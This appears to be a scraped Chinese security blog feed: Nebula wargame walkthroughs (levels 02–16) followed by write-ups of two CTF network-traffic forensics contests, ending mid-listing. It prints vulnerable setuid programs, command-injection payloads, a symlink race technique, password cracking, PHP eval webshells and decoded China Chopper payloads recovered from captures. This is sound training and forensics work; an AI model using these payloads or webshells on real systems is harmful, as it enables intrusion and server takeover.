这个可执行程序这个时候就会执行正常的echo。那我们的思路是 在/usr/bin这个环境变量之前添加个环境变量/home/level01，在’level01’里面有个我们自定义的echo. 这样不就执行我们自己的程序了 0x03 level02 There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02. 1234567891011121314151617181920212223242526#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp)&#123; char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;buffer, \"/bin/echo %s is cool\", getenv(\"USER\")); printf(\"about to call system(\\\"%s\\\")\\n\", buffer); system(buffer);&#125; 跟上面类似，就要构造USER的值来填补，就可以进一步调用/bin/sh 0x04 level03 Check the home directory of flag03 and take note of the files there.There is a crontab that is called every couple of minutes.To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03. 在/home/flag03里面发现有一个文件writable.sh和writable.d查看writeable.sh的内容大意就是循环执行一遍writable.d文件夹底下的文件。然后删除。这个时候看题目，There is a crontab that is called every couple of minutes.几分钟会被调用一次。我们猜测可能是执行writable.sh把我们要执行的东西写到 writable.d里面去然后等个几分钟 接下来我们用root身份来看下corntab. 每三分钟执行一次writable.sh 0x05 level04 This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04. 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv, char **envp)&#123; char buf[1024]; int fd, rc; if(argc == 1) &#123; printf(\"%s [file to read]\\n\", argv[0]); exit(EXIT_FAILURE); &#125; if(strstr(argv[1], \"token\") != NULL) &#123; printf(\"You may not access '%s'\\n\", argv[1]); exit(EXIT_FAILURE); &#125; fd = open(argv[1], O_RDONLY); if(fd == -1) &#123; err(EXIT_FAILURE, \"Unable to open %s\", argv[1]); &#125; rc = read(fd, buf, sizeof(buf)); if(rc == -1) &#123; err(EXIT_FAILURE, \"Unable to read fd %d\", fd); &#125; write(1, buf, rc);&#125; 分析:查看文件token这个文件的权限是0600，只允许flag04用户读取,没有读取权限。但是flag04这个文件我们有执行权限，隶属于flag04用户，并且有suid。简单分析源码，这个程序的主要功能就是读取文件输出。所以只要我们利用这个文件来读物token 就行，但是有个限制，就是读取的文件名不能叫做token。所以只需要利用软连接，建立一个名字中不含有token的文件，软链接到token 。 0x06 level05 Check the flag05 home directory. You are looking for weak directory permissionsTo do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05. 看到.ssh文件夹，推测可能是想通过ssh 登陆进来，但是.ssh文件夹的权限700。我们没有查看权限。这时候看到backup文件夹看到一个备份文件夹。解压下，果然是.ssh的压缩，就可以利用私钥登陆登陆成功 0x07 level06 The flag06 account credentials came from a legacy unix system.To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06. 通过这句话The flag06 account credentials came from a legacy unix system.，比较旧版本的Unix的密码是放在/etc/passwd这个时候我们就可以用john爆破，这里用的是kali上自带的然后登陆 0x08 level07 The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.源码12345678910111213141516171819use CGI qw&#123;param&#125;;print \"Content-type: text/html\\n\\n\";sub ping &#123; $host = $_[0]; print(\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;\"); @output = `ping -c 3 $host 2&gt;&amp;1`; foreach $line (@output) &#123; print \"$line\"; &#125; print(\"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\"); &#125;# check if Host set. if not, display normal page, etcping(param(\"Host\")); 看这行代码ping -c 3 $host 2&gt;&amp;1,典型的命令注入，构造host=127.0.01;whoami就可以执行whoami 0x09 level08 World readable files strike again. Check what that user was up to, and use it to log into flag08 account.To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08. 看到一个流量包wireshark 追踪流，以16进制形式展开其中7f是删除键,所以密码为backd00Rmate 0x0A level09 There’s a C setuid wrapper for some vulnerable PHP code…To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09. 源码1234567891011121314151617181920212223242526&lt;?phpfunction spam($email)&#123; $email = preg_replace(\"/\\./\", \" dot \", $email); $email = preg_replace(\"/@/\", \" AT \", $email); return $email;&#125;function markup($filename, $use_me)&#123; $contents = file_get_contents($filename); $contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents); $contents = preg_replace(\"/\\[/\", \"&lt;\", $contents); $contents = preg_replace(\"/\\]/\", \"&gt;\", $contents); return $contents;&#125;$output = markup($argv[1], $argv[2]);print $output;?&gt; 0x0B level10 The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call. 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char *file; char *host; if(argc &lt; 3) &#123; printf(\"%s file host\\n\\tsends file to host if you have access to it\\n\", argv[0]); exit(1); &#125; file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) &#123; int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(\"Connecting to %s:18211 .. \", host); fflush(stdout); fd = socket(AF_INET, SOCK_STREAM, 0); memset(&amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(host); sin.sin_port = htons(18211); if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) &#123; printf(\"Unable to connect to host %s\\n\", host); exit(EXIT_FAILURE); &#125;#define HITHERE \".oO Oo.\\n\" if(write(fd, HITHERE, strlen(HITHERE)) == -1) &#123; printf(\"Unable to write banner to host %s\\n\", host); exit(EXIT_FAILURE); &#125;#undef HITHERE printf(\"Connected!\\nSending file .. \"); fflush(stdout); ffd = open(file, O_RDONLY); if(ffd == -1) &#123; printf(\"Damn. Unable to open file\\n\"); exit(EXIT_FAILURE); &#125; rc = read(ffd, buffer, sizeof(buffer)); if(rc == -1) &#123; printf(\"Unable to read from file: %s\\n\", strerror(errno)); exit(EXIT_FAILURE); &#125; write(fd, buffer, rc); printf(\"wrote file!\\n\"); &#125; else &#123; printf(\"You don't have access to %s\\n\", file); &#125;&#125; 这是一种叫文件访问竞态条件的漏洞.维基百科里面介绍的很详细了Time_of_check_to_time_of_use.大体利用是这用的。先大体看下代码首先通过access 验证是否有文件读取权限if(access(argv[1], R_OK) == 0)。前面有说到suid会在执行的时候暂时性拥有文件拥有者的权限。这个在底层代码里面体现为euid，即有限的uid，比如我当前用户是level10,uid为1011，那执行正常的程序的时候我们euid=uid=1011，但是在有suid的程序中，euid=文件拥有者的uid=flag10的uid=989。一般的判断都是通过euid。但是这里有个意外，就是access是通过uid而不是euid。所以这里，执行者为level10，没有执行的权限，验证不通过。维基百科上给出的利用条件是利用软连接代码是这样的123456if(access(文件名, R_OK) == 0) &#123; ... ffd = open(file, O_RDONLY); ... rc = read(ffd, buffer, sizeof(buffer)); &#125; 我们用个软连接，让access之前lntoken 链接到 faketoken，这里的话，level10对 faketoken具有读取权限，验证通过。。接下来在open之前。把lntoken 链接到token，这个时候由于是suid，而且open 验证的是euid。所以读取成功。我们想实现的伪代码如下12345678ln -sf faketoken lntokenif(access(文件名, R_OK) == 0) &#123; =&gt; 验证通过 ln -sf realtoken lntoken =&gt; 已经指向正确的token 了 ... ffd = open(file, O_RDONLY); ... rc = read(ffd, buffer, sizeof(buffer)); &#125; 这种现象在单线程下几乎不可能，控制到那么精准的时间更换软连接。但是现在的Linux几乎是多线程的，就可以条件竞争。具体利用如下新建fakeotkoen新建个不断软连接的死循环，这里我用-x 方便看到具体过程再看一个终端，不断执行程序。 接收到真的token可以登录了 0x0C level11 The /home/flag11/flag11 binary processes standard input and executes a shell command.There are two ways of completing this level, you may wish to do both :-) 0x0D level12 There is a backdoor process listening on port 50001. 源码123456789101112131415161718192021222324252627282930313233local socket = require(\"socket\")local server = assert(socket.bind(\"127.0.0.1\", 50001))function hash(password) prog = io.popen(\"echo \"..password..\" | sha1sum\", \"r\") data = prog:read(\"*all\") prog:close() data = string.sub(data, 1, 40) return dataendwhile 1 do local client = server:accept() client:send(\"Password: \") client:settimeout(60) local line, err = client:receive() if not err then print(\"trying \" .. line) -- log from where ;\\ local h = hash(line) if h ~= \"4754a4f4bd5787accd33de887b9250a0691dd198\" then client:send(\"Better luck next time\\n\"); else client:send(\"Congrats, your token is 413**CARRIER LOST**\\n\") end end client:close()end 看下这个程序，就是把你输入的密码经过hash后跟4754a4f4bd5787accd33de887b9250a0691dd198比较，如果一样，就输出Congrats, your token is 413**CARRIER LOST**。这里面的hash是自定义的123456789function hash(password) prog = io.popen(\"echo \"..password..\" | sha1sum\", \"r\") data = prog:read(\"*all\") prog:close() data = string.sub(data, 1, 40) return dataend 。问题就出再popen里面prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)。通过调用系统命令来获取hash的。这一步拼接字符串，造成任意命令执行。所以我们构造;id &gt; /tmp/id看看是flag12的 0x0E level13 There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id. 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;string.h&gt;#define FAKEUID 1000int main(int argc, char **argv, char **envp)&#123; int c; char token[256]; if(getuid() != FAKEUID) &#123; printf(&quot;Security failure detected. UID %d started us, we expect %d\\n&quot;, getuid(), FAKEUID); printf(&quot;The system administrators will be notified of this violation\\n&quot;); exit(EXIT_FAILURE); &#125; // snip, sorry :) printf(&quot;your token is %s\\n&quot;, token); &#125; 这是一道简单的ELF逆向题，我这里提供两种思路第一种动态调试.我用的是IDA.在IDA的dbgsrv文件夹底下将linux_server拷贝到Linux服务器上运行，，然后打开ida 。Debugger -&gt; run -&gt; remote Linux debugger然后开始配置Application输要调试程序在服务器上的绝对路径。Diresctory 输所在的路径Host 输服务器的IP跟OD基本一样了，F2在main函数下个断点，然后单步调试执行到080484F9处，这里面的判断正是if(getuid() != FAKEUID)这个判断，通过修改zf标志位改变执行流程。在服务器端输出token 的值用于登陆第二种方法是通过IDA静态查看代码，手动计算token的值利用F5插件，查看类C代码1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; __uid_t v3; // eax int v4; // ecx int i; // [esp+28h] [ebp-110h] int v7; // [esp+2Ch] [ebp-10Ch] unsigned int v8; // [esp+12Ch] [ebp-Ch] v8 = __readgsdword(0x14u); if ( getuid() != 1000 ) &#123; v3 = getuid(); printf(\"Security failure detected. UID %d started us, we expect %d\\n\", v3, 1000); puts(\"The system administrators will be notified of this violation\"); exit(1); &#125; memset(&amp;v7, 0, 0x100u); strcpy(&amp;v7, \"8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob\"); v4 = *(_DWORD *)\";9ob\"; for ( i = 0; *((_BYTE *)&amp;v7 + i); ++i ) *((_BYTE *)&amp;v7 + i) ^= 0x5Au; return printf(\"your token is %s\\n\", &amp;v7);&#125; 关键在123456memset(&amp;v7, 0, 0x100u);strcpy(&amp;v7, &quot;8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob&quot;);v4 = *(_DWORD *)&quot;;9ob&quot;;for ( i = 0; *((_BYTE *)&amp;v7 + i); ++i ) *((_BYTE *)&amp;v7 + i) ^= 0x5Au;return printf(&quot;your token is %s\\n&quot;, &amp;v7); 这里面V7的值就是token 。我使用python 计算123456789#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-06-07 19:13:48# @Author : daiker (daikersec@gmail.com)# @Link : http://daikersec.com# @Version : $Id$token = \"8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob\"print ''.join([chr(ord(i)^0x5A) for i in token]) 得到token 0x0F level14 This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :) 是个加密程序，利用IDA来看下加密算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; bool v3; // cf bool v4; // zf signed int v5; // ecx const char *v6; // esi _BYTE *v7; // edi int v8; // [esp+2Ch] [ebp-5Ch] signed int i; // [esp+30h] [ebp-58h] signed int v10; // [esp+34h] [ebp-54h] char buf[64]; // [esp+3Ch] [ebp-4Ch] unsigned int v12; // [esp+7Ch] [ebp-Ch] v12 = __readgsdword(0x14u); v8 = 0; if ( argc &lt;= 1 ) goto LABEL_17; v3 = __CFADD__(argv, 4); v4 = argv + 1 == 0; v5 = 3; v6 = argv[1]; v7 = &amp;unk_8048660; do &#123; if ( !v5 ) break; v3 = (const unsigned __int8)*v6 &lt; *v7; v4 = *v6++ == *v7++; --v5; &#125; while ( v4 ); if ( (!v3 &amp;&amp; !v4) != v3 ) &#123;LABEL_17: printf(&quot;%s\\n\\t-e\\tEncrypt input\\n&quot;, *argv); exit(1); &#125; while ( 1 ) &#123; v10 = read(0, buf, 0x40u); if ( v10 &lt;= 0 ) break; for ( i = 0; i &lt; v10; ++i ) buf[i] += v8++; if ( write(1, buf, v10) &lt;= 0 ) exit(0); &#125; exit(0);&#125; 核心加密在 12345678910while ( 1 ) &#123; v10 = read(0, buf, 0x40u); if ( v10 &lt;= 0 ) break; for ( i = 0; i &lt; v10; ++i ) buf[i] += v8++; if ( write(1, buf, v10) &lt;= 0 ) exit(0); &#125; 就是将每个字节的ASCII加上0,1,2,3这样，用python 写个解密算法 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-06-07 19:53:26# @Author : daiker (daikersec@gmail.com)# @Link : http://daikersec.com# @Version : $Id$with open(\"token\",\"rb\") as f: order = 0 token = \"\" while True: data = f.read(1) if not data: break token += chr(ord(data)-order) order += 1print token token为 0x10level15 strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.Clean up after yourself :) 0x11 level16 There is a perl script running on port 1616. 源码12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env perluse CGI qw&#123;param&#125;;print \"Content-type: text/html\\n\\n\";sub login &#123; $username = $_[0]; $password = $_[1]; $username =~ tr/a-z/A-Z/; # conver to uppercase $username =~ s/\\s.*//; # strip everything after a space @output = `egrep \"^$username\" /home/flag16/userdb.txt 2&gt;&amp;1`; foreach $line (@output) &#123; ($usr, $pw) = split(/:/, $line); if($pw =~ $password) &#123; return 1; &#125; &#125; return 0;&#125;sub htmlz &#123; print(\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\"); if($_[0] == 1) &#123; print(\"Your login was accepted&lt;br/&gt;\"); &#125; else &#123; print(\"Your login failed&lt;br/&gt;\"); &#125; print(\"Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\\n\");&#125;htmlz(login(param(\"username\"), param(\"password\")));","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"提权","slug":"渗透测试/提权","permalink":"http://www.daikersec.com/categories/渗透测试/提权/"},{"name":"Linux","slug":"渗透测试/提权/Linux","permalink":"http://www.daikersec.com/categories/渗透测试/提权/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"提权","slug":"提权","permalink":"http://www.daikersec.com/tags/提权/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/tags/渗透测试/"}]},{"title":"铁人三项2018第七赛区(福建)数据赛wp","slug":"铁人三项2018第七赛区-福建-数据赛wp","date":"2018-05-15T13:44:37.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/ba9a968.html","link":"","permalink":"http://www.daikersec.com/wiki/ba9a968.html","excerpt":"0x00 题目链接:密码：0ple题目:密码：ngkm","text":"0x00 题目链接:密码：0ple题目:密码：ngkm 0x01 写webshell先通过httppcap 提取出http浏览脚本如下1234for file in `ls`do parse_pcap -vvv $file &gt; content/$file.txtdone 第一关是关卡描述：网站后台密码是多少这里制作一个匹配脚本，后面用的到123456for file in `ls`do echo $file cat $file|grep $1 echo \"-----------------------------------------------------\"done 执行./1.sh pass发现大量爆破接下来匹配./1.sh &quot;&amp;password=&quot;尝试下查看下最后一个爆破的回包username=admin&amp;password=aabbcc在结合302，location，set-Cookie可以看出这个已经爆破成功，所以第一题关卡描述：网站后台密码是多少是aabbcc。攻击者IP是202.1.1.2。接下来看第三题。网站后台登陆地址是多少（http://+ip+路径）找到一个爆破的包，有这么几行123[202.1.1.2:15717] -- -- --&gt; [192.168.1.203:80] POST /ad_admin.php?mod=login HTTP/1.1Host: 202.1.1.1 我就填了http://202.1.1.1/ad_admin.php结果不行，后来填了http://192.168.1.203/ad_admin.php，答案正确，我觉得应该是第一个更贴切。接下来的问题是找webshell。我通过匹配菜刀连接特征寻找猜到痕迹。在data-sence2_00003_20180204180642.pcapng.txt里面,向前看，在第一个shell2.php前面，爆破成功后面找到这句话解码得到$fp = fopen(&quot;shell2.php&quot;, &quot;w&quot;);fwrite($fp, &quot;&lt;?php eval(\\$_POST[&#39;cmd&#39;]);?&gt;&quot;);fclose($fp);所以webshell的内容是&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;接下来从第五题开始分析的是菜刀里面的内容 0x02 菜刀内容5. 关卡描述：网站数据库密码是多少在data-sence2_00007_20180204183072.pcapng.txt里面所以密码是newnrtpassword6. 黑客第一个上传的php文件名是什么在data-sence2_00005_20180204181416.pcapng里面解码为1@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$f=&apos;/var/www/html/diypage/scan.php&apos;;$c=$_POST[&quot;z1&quot;];$c=str_replace(&quot;\\r&quot;,&quot;&quot;,$c);$c=str_replace(&quot;\\n&quot;,&quot;&quot;,$c);$buf=&quot;&quot;;for($i=0;$i&lt;strlen($c);$i+=2)$buf.=urldecode(&apos;%&apos;.substr($c,$i,2));echo(@fwrite(fopen($f,&apos;w&apos;),$buf)?&apos;1&apos;:&apos;0&apos;);;echo(&quot;X@Y&quot;);die(); 所以结果为scan.php7. 关卡描述：黑客对内网扫描的范围是多少(ip1-ip2)结合上面的scan.php，应该是通过scan.php来匹配的。我们匹配下./1.sh scan.php在data-sence2_00005_20180204181416.pcapng里面是从192.168.2.1到192.168.2.1508. 描述：黑客下载的数据库备份文件名是什么匹配./1.sh bak所以是bak_2018-01-29-17-47-52.zip9. 关卡描述：黑客上传的图片木马的密码是多少用./1.sh &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;匹配菜刀内容，图片应该post的包是蛮大的。总共比较大的就几个。然后一个个解码，根据文件名，找到favicon.ico&#39; 在data-sence2_00007_20180204183702.pcapng里面 拖进winhex所以图片马的密码是 picto10. 黑客修改了哪个文件来配合木马文件(绝对路径)上面传的是图片马，不能直接利用，要配合使用，应该 是利用文件包含先过滤菜刀，再过滤include./1.sh &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;|grep include在这里面看到include%28..%2Ffavicon.ico解码，得到文件名为/var/www/html/diypage/adm/obj_edit.php接下来的操作都是通过tunnel代理 0x03 web代理11 关卡描述：FTP服务器开在了哪个端口reGeorg这个工具常用于web代理，查找端口我们可以直接利用./1.sh &#39;?cmd=connect&amp;target=&#39;过滤，查找到有1433，10062，10063三个端口，我们一个个过滤(比赛的时候懒得过滤，有5次提交机会，所以一个个试，是1433).通过wireshark过滤tcp.port == 1433 || udp.port == 1433追踪流可以看到ftp登录，因此就是他了12 黑客使用FTP上传的文件名追踪1433的流，发现大量登录爆破，在成功的那个流里面文件名是readmd.rtf13 黑客登陆FTP的密码是多少也是在这个流里面密码是qweasd123!@#14. 黑客使用FTP上传的文件中的文件内容是什么在这个的中间寻找流，刚好在226上面那条","categories":[{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/categories/取证/"},{"name":"流量分析","slug":"取证/流量分析","permalink":"http://www.daikersec.com/categories/取证/流量分析/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"http://www.daikersec.com/tags/wireshark/"},{"name":"数据分析","slug":"数据分析","permalink":"http://www.daikersec.com/tags/数据分析/"},{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/tags/取证/"},{"name":"日志分析","slug":"日志分析","permalink":"http://www.daikersec.com/tags/日志分析/"},{"name":"流量分析","slug":"流量分析","permalink":"http://www.daikersec.com/tags/流量分析/"}]},{"title":"铁人三项数据赛样题分析","slug":"铁人三项数据赛样题分析","date":"2018-04-22T14:30:02.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/3c7f43ba.html","link":"","permalink":"http://www.daikersec.com/wiki/3c7f43ba.html","excerpt":"0x00 题目下载链接: 数据赛 密码：wabt 解压密码：t3sectimu题目要求:背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。问题： （1）黑客最终获得了什么用户名（2）黑客最终获得了什么密码（3）黑客修改了什么文件（4）黑客使用菜刀的完整连接地址（5）黑客使用菜刀的连接密码(6)黑客的查看的第一个文件目录是什么","text":"0x00 题目下载链接: 数据赛 密码：wabt 解压密码：t3sectimu题目要求:背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。问题： （1）黑客最终获得了什么用户名（2）黑客最终获得了什么密码（3）黑客修改了什么文件（4）黑客使用菜刀的完整连接地址（5）黑客使用菜刀的连接密码(6)黑客的查看的第一个文件目录是什么 0x01 初步分析攻击者IP我们在假定攻击者攻击成功的情况下，应该会留下网页木马，先看下最后一个被访问的那些链接，这里通过Web Log Explorer的Exit Point查看这里看到三个比较可疑的 123tunnel.phpbackdoor.phpy0n.php 然后看三个中最早的具体保文，可以看到 1172.16.61.210 (LOCAL NETWORK) 2016/8/10 1:16:07 /y0n.php 200 - OK No Referrer 1172.16.61.210 (LOCAL NETWORK) 2016/8/10 1:15:38 /backdoor.php 200 - OK No Referrer 1101.36.79.67 (Beijing,Beijing,China) 2016/8/10 1:03:07 /tunnel.php 28 200 - OK No Referrer 这里面的/tunnel.php，如果我们做过内网渗透的时候应该都知道，这个是一个HTTP代理，我们又注意到backdoor.php和y0n.php的访问IP都是内网，再看下访问时间，可以推出攻击者是通过tunnul代理进来的。攻击者IP大致可以确定是101.36.79.67。现在已经的最早攻击成功时间是2016/8/10 1:03:07.这个情况下分析下101.36.79.67这个IP的访问记录。我们通过Apache Logs Viewer来过滤IP。分析攻击过程这里面没发现有啥能getshell的操作。这条思路断了。 0x02 再分析攻击者IP接下来通过单个页面的点击情况来分析(正常首页那种情况访问量应该多，，后台的访问应该比较少)然后这里陷入一个惯性思维，，以为index.php一定是首页。点进去才看到index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=xFbuB1这样的链接，想起来这是用MVC书写的时候的链接上次。点进index.php这里发现大量对后台进行访问，，初步推测可能在爆破账号密码。对IP进行过滤，排除掉内网IP，得到219.239.105.18这个IP 0x03 分析攻击过程我们通过Apache Logs Viewer来过滤IP我们分析该IP大约从2016/8/9 22:17分开始进行爆破(后台，发送大量POST包可以推断出来)，然后我们往后看大约在 2016/8/9 23:02 爆破成功接下来我们看到这里使用模板的editFile,修改的search 的index.html。然后后面通过POST访问search这个，模块，，初步推测，，这里是种马和访问马的过程。这里单纯看日志有个不好的地方，，就是看不到POST的body里面的内容，这个时候就得结合流量包。 0x04 分析攻击流量我们通过流量包来验证上面日志的分析 分析爆破出来的账号密码如果直接用wireshark一个个打开，太大了。这里推荐个软件 httppcap 专门用来提取http数据包的。总共有8个流量包，，如果一个个分析的话太繁琐，我们先大约估计爆破的在哪几个包里面。通过一下shell脚本，提取每个包里面来自219.239.105.18的http请求头部1234for file in `ls`do parse-pcap -i 219.239.105.18 $file &gt;&gt; txt/$file.txtdone 然后匹配哪些包里面含有m=index这样的请求123456for file in `ls`do echo $file cat $file|grep &apos;/index.php?m=admin&apos; echo &quot;-----------------------------------------------------&quot;done 得到爆破的流量都在数据采集D_eth0_NS_20160810_130801.pcap这个文件里面接下来使用1parse-pcap -i 219.239.105.18 -vvv 数据采集D_eth0_NS_20160810_130801.pcap &gt; txt/all.txt 来查看所有的爆破时候的http具体报文如图,爆破的数据包在里面，，接下来寻找爆破成功的那个根据发包时间和回包大小我们确实了登录成功的账号为root，密码为123456。 0x02 分析一句话通过上面方法匹配m=search,得到报文在数据采集D_eth0_NS_20160810_141903.pcap,数据采集D_eth0_NS_20160810_142037.pcap,数据采集D_eth0_NS_20160810_142224.pcap里面然后提取报文详情熟悉的一句话,urldecode一下 1chopper=@eval\u0001(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw== 密码为chooper 第一个目录是/var/www/html 0x03 一句话操作分析总共有15个一句话操作第一个解码完就是 12345678910111213141516&lt;?php@ini_set(\"display_errors\", \"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\"-&gt;|\");$D = dirname($_SERVER[\"SCRIPT_FILENAME\"]);if ($D == \"\") $D = dirname($_SERVER[\"PATH_TRANSLATED\"]);$R = \"&#123;$D&#125;\\t\";if (substr($D, 0, 1) != \"/\") &#123; foreach (range(\"A\", \"Z\") as $L) if (is_dir(\"&#123;$L&#125;:\")) $R .= \"&#123;$L&#125;:\";&#125;$R .= \"\\t\";$u = (function_exists('posix_getegid')) ? @posix_getpwuid(@posix_geteuid()) : '';$usr = ($u) ? $u['name'] : @get_current_user();$R .= php_uname();$R .= \"(&#123;$usr&#125;)\";print $R;;echo(\"|&lt;-\");die();?&gt; 这个脚本的作用是获取网页所在的绝对路径接下来依次分析，分别是查看 /var/www/html 目录底下的文件内容有这些 123456789101112131415161718caches/ 2016-08-04 10:40:44 4096 0777uploadfile/ 2016-08-04 11:01:20 4096 0777statics/ 2016-08-04 10:38:16 4096 0777api/ 2016-08-04 10:38:16 4096 0777../ 2016-08-04 10:37:16 4096 0755phpsso_server/ 2016-08-04 10:38:16 4096 0777html/ 2016-08-04 10:46:37 4096 0777./ 2016-08-04 10:39:54 4096 0777phpcms/ 2016-08-04 10:38:16 4096 0777plugin.php 2016-08-04 10:38:16 3573 0777index.html 2016-08-04 11:55:19 17588 0777crossdomain.xml 2016-08-04 10:38:16 104 0777robots.txt 2016-08-04 10:38:16 170 0777admin.php 2016-08-04 10:38:16 48 0777api.php 2016-08-04 10:38:16 595 0777index.php 2016-08-04 10:38:16 318 0777js.html 2016-08-04 10:38:16 523 0777favicon.ico 2016-08-04 10:38:16 3158 0777 接下来查看的是根目录底下的文件夹,有 123456789101112131415161718192021222324var/ 2016-07-22 19:50:16 4096 0755selinux/ 2016-07-16 00:59:51 0 0755lib/ 2016-07-11 23:51:40 4096 0555dev/ 2016-07-16 01:01:30 3740 0755media/ 2016-07-12 00:18:35 4096 0755usr/ 2016-07-11 23:46:08 4096 0755tmp/ 2016-08-09 18:16:02 4096 1777etc/ 2016-08-09 18:16:11 12288 0755proc/ 2016-07-16 00:59:50 0 0555bin/ 2016-07-16 02:18:03 4096 0555../ 2016-07-16 01:00:10 4096 0555home/ 2016-08-04 10:23:14 4096 0755srv/ 2011-09-23 19:50:20 4096 0755opt/ 2016-07-12 00:03:18 4096 0755sbin/ 2016-07-16 02:18:04 12288 0555data1/ 2016-07-12 00:11:00 4096 0755./ 2016-07-16 01:00:10 4096 0555mnt/ 2016-07-12 00:01:13 4096 0755sys/ 2016-07-16 00:59:50 0 0755lib64/ 2016-07-16 02:17:51 12288 0555boot 1970-01-01 08:00:00 0root 1970-01-01 08:00:00 0.autofsck 2016-07-16 